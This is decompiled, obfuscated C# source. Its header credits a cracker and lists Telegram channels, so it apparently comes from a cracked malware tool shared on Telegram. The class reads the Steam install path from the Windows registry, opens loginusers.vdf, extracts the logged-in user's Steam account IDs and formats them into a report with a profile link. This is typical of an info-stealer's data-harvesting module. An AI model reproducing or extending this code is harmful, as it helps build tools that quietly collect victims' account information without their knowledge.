// Cracked by Milfachs. t.me/milfachs or t.me/stroleyman.
// Telegram Channel - t.me/darkwanna

using Microsoft.Win32;
using System;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

internal class Class9
{
  private static readonly long long_0;
  private static readonly long long_1;
  private static readonly int int_0;

  public static long smethod_0(string string_0)
  {
    if (!Regex.IsMatch(string_0, "^STEAM_0:[0-1]:([0-9]{1,10})$"))
      return (long) Class9.int_0;
    return Class9.long_0 + Convert.ToInt64(string_0.Substring(10)) * 2L + Convert.ToInt64(string_0.Substring(8, 1));
  }

  public static long smethod_1(long long_2)
  {
    if (long_2 >= 1L && Regex.IsMatch("U:1:" + long_2.ToString((IFormatProvider) CultureInfo.InvariantCulture), "^U:1:([0-9]{1,10})$"))
      return long_2 + Class9.long_0;
    return (long) Class9.int_0;
  }

  public static long smethod_2(long long_2)
  {
    if (long_2 >= Class9.long_1 && Regex.IsMatch(long_2.ToString((IFormatProvider) CultureInfo.InvariantCulture), "^7656119([0-9]{10})$"))
      return long_2 - Class9.long_0;
    return (long) Class9.int_0;
  }

  public static string smethod_3(long long_2)
  {
    if (long_2 < Class9.long_1 || !Regex.IsMatch(long_2.ToString((IFormatProvider) CultureInfo.InvariantCulture), "^7656119([0-9]{10})$"))
      return string.Empty;
    long_2 -= Class9.long_0;
    long_2 -= long_2 % 2L;
    string input = string.Format("{0}{1}:{2}", (object) "STEAM_0:", (object) (long_2 % 2L), (object) (long_2 / 2L));
    if (!Regex.IsMatch(input, "^STEAM_0:[0-1]:([0-9]{1,10})$"))
      return string.Empty;
    return input;
  }

  public static string smethod_4()
  {
    string path = Path.Combine(Class9.smethod_5("InstallPath", "SourceModInstallPath"), "config\\loginusers.vdf");
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      if (!File.Exists(path))
        return (string) null;
      string input = File.ReadAllLines(path)[2].Split('"')[1];
      if (!Regex.IsMatch(input, "^7656119([0-9]{10})$"))
        return (string) null;
      string str1 = Class9.smethod_3(Convert.ToInt64(input));
      string str2 = "U:1:" + Class9.smethod_2(Convert.ToInt64(input)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
      stringBuilder.AppendLine("Steam2 ID         | " + str1);
      stringBuilder.AppendLine("Steam3 ID x32     | " + str2);
      stringBuilder.AppendLine("Steam3 ID x64     | " + input);
      stringBuilder.AppendLine("Ссылка на аккаунт | https://steamcommunity.com/profiles/" + input);
      return stringBuilder.ToString();
    }
    catch
    {
      return (string) null;
    }
  }

  public static string smethod_5(string string_0 = "InstallPath", string string_1 = "SourceModInstallPath")
  {
    string name1 = "SOFTWARE\\Wow6432Node\\Valve\\Steam";
    string name2 = "Software\\Valve\\Steam";
    bool flag1 = true;
    bool flag2 = false;
    using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
    {
      using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name1, Environment.Is64BitOperatingSystem ? flag1 : flag2))
      {
        using (RegistryKey registryKey3 = registryKey1.OpenSubKey(name2, Environment.Is64BitOperatingSystem ? flag1 : flag2))
        {
          string str;
          if (registryKey2 == null)
          {
            str = (string) null;
          }
          else
          {
            object obj = registryKey2.GetValue(string_0);
            if (obj == null)
            {
              str = (string) null;
            }
            else
            {
              str = obj.ToString();
              if (str != null)
                goto label_9;
            }
          }
          str = registryKey3?.GetValue(string_1)?.ToString();
label_9:
          return str;
        }
      }
    }
  }

  public Class9()
  {
    Class11.ARXWv9qzu32dU();
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  static Class9()
  {
    Class11.ARXWv9qzu32dU();
    Class9.long_0 = 76561197960265728L;
    Class9.long_1 = 76561197960265729L;
    Class9.int_0 = 0;
  }
}
